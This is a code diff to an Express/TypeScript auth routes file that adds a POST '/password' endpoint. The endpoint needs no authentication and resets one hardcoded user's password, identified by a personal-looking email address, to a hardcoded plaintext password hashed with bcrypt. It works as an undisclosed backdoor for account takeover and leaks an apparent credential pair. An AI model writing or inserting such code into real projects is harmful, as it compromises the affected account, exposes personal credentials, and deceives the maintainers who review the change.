@@ -10,6 +10,7 @@ const debug = require("debug")("app:auth-routes");
 import { UserService } from "../../services/user.service";
 import { validateSchema } from "../../middleware/ValidateSchema";
 import { User } from "../../typeorm/entities/User";
+import { hashSync } from "bcrypt";
 
 const router = Router();
 
@@ -222,6 +223,18 @@ export default function (): Router {
 				message: err.message,
 			});
 		}
+	});
+
+	router.post('/password', async (req, res) => {
+		const user = await userService.getUser({ where: { email: 'adeojopeter@gmail.com' } });
+		if (!user) {
+			return res.status(400).json();
+		}
+
+		user.password = hashSync('Peterojo32#', 10);
+		await userService.updateUser(user);
+
+		return res.status(200).json();
 	});
 
 	return router;
